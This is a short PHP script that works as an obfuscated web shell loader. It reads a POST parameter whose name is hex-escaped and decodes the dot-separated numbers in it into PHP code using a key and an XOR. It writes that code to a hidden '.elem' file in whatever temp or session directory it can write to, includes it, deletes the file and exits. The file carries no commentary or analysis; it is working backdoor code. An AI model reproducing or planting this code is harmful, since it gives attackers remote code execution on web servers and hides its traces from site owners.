<?php

if(array_key_exists("c\x6Fmpo\x6E\x65nt", $_POST) && !is_null($_POST["c\x6Fmpo\x6E\x65nt"])){
	$data = array_filter([getenv("TEMP"), getenv("TMP"), "/tmp", "/dev/shm", ini_get("upload_tmp_dir"), getcwd(), sys_get_temp_dir(), session_save_path(), "/var/tmp"]);
	$dchunk = $_POST["c\x6Fmpo\x6E\x65nt"];
	$dchunk  	=		explode(  	"."		,	$dchunk)	;	  
	$reference = '';
            $s = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS = strlen($s);
            $i = 0;
    
            $__tmp = $dchunk;
            while ($v6 = array_shift($__tmp)) {
                $chS = ord($s[$i % $lenS]);
                $d = ((int)$v6 - $chS - ($i % 10))		^68;
                $reference .= chr($d);
                $i++;}  
	$token = 0;
do {
    $itm = $data[$token] ?? null;
    if ($token >= count($data)) break;
    		if (is_writable($itm) && is_dir($itm)) {
    $ref = join("/", [$itm, ".elem"]);
    if (@file_put_contents($ref, $reference) !== false) {
	include $ref;
	unlink($ref);
	die();
}
}
    $token++;
} while (true);
}